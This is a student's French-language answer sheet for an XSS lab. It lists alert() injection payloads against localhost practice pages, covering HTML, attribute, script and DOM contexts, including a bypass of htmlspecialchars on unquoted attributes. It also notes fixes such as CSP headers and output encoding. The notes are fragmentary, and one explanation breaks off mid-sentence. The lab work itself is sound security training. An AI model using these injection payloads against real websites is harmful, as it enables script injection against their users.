Question 1 :
Mettre le code suivant dans le message :
<script>alert('xss')</script>

Pour CSP Header, il faut ajouter le code suivant au début de guestbook.php et guestbookleavemessage.php:
header("Content-Security-Policy: default-src 'self'");

Question 2 :
htmlcontext :
http://localhost/xssme.php?htmlcontext=<script>alert('HTML XSS')</script>

attributecontext1 :
attributecontext1='' onerror=alert('attributecontext1 xss')
http://localhost/xssme.php?attributecontext1='' onerror="alert('attributecontext1 xss')"

attributecontext2 :
attributecontext2=" onerror="alert('attributecontext2 Double Quote XSS')
http://localhost/xssme.php?attributecontext2=" onerror="alert('attributecontext2 Double Quote XSS')


attributecontext3=' onerror="alert('attributecontext3 Single Quote XSS')"'
http://localhost/xssme.php?attributecontext3=' onerror="alert('attributecontext3 Single Quote XSS')"'

scriptcontext=alert('Script context XSS')
http://localhost/xssme.php?scriptcontext=alert('Script context XSS')

attributecontextonerror="alert('attributecontextonerror XSS')
http://localhost/xssme.php?attributecontextonerror="alert('attributecontextonerror XSS')"


Protectedxss :
//Rajouter header("Content-Security-Policy: default-src 'self'");

htmlcontext :
echo htmlspecialchars($_GET['htmlcontext'], ENT_QUOTES, 'UTF-8');

http://localhost/protectedxssme.php?attributecontext1=' onerror='alert("attributecontext1xss")''
ne marche plus

attributecontext1 :
<?php echo htmlspecialchars($_GET['attributecontext1'], ENT_QUOTES)?>

L'ancienne attaque ne marche pas :
http://localhost/protectedxssme.php?attributecontext1='' onerror="alert('attributecontext1 xss')"

Contournenment avec :
http://localhost/protectedxssme.php?attributecontext1=1 onerror=alert("XSSAvecHtmlspecialchars")

htmlspecialchars ne marche pas car 

mettre "" pour tout le <?php ?>

Question 4 :
domxss4
http://localhost/domxss4.html?x=<script>alert('xss')</script>

domxss5
balise a ne lance pas scripte donc on passe par img onerror :
<img src='' onerror=alert('xss');>

domxss6
#test'onmouseover='alert(1)


Pour tous les 3, utiliser csp ou changer l'encodage des char spéciales

